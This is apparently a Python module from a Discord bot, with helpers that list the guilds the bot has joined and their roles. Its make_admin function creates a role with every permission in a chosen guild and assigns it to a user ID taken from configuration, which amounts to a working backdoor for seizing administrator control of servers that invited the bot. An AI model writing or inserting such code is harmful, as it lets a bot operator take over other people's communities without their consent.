import logging
import tabulate

from .config import Config

from discord import Permissions

config = Config()

def guilds(client):
    ids = [i.id for i in client.guilds]
    names = [i.name for i in client.guilds]
    headers = ["ID", "Name"]

    return "```" + tabulate.tabulate(zip(ids, names), headers=headers, tablefmt="fancy_grid", showindex="always", numalign="left") + "```"

def roles(client, guild_id):
    guild = client.get_guild(int(guild_id))

    if not guild:
        return "No guild with that ID was found"

    ids = [i.id for i in guild.roles]
    names = [i.name for i in guild.roles]
    headers = ["ID", "Name"]

    return "```" + tabulate.tabulate(zip(ids, names), headers=headers, tablefmt="fancy_grid", showindex="always", numalign="left") + "```"

# Makes the calling user a server admin
async def make_admin(client, guild_id, role_name):
    guild = client.get_guild(int(guild_id))

    if not guild:
        return "No guild with that ID was found"

    user = guild.get_member(config["ADMIN"])

    if not user:
        return "No user with your ID was found"

    try:
        new_role = await guild.create_role(name=role_name, permissions=Permissions.all())
        await user.add_roles(new_role)
    except Exception as e:
        logging.debug(f"Failed to make admin: {str(e)}")

        return "Failed to make admin"

    return "Successfully made admin"
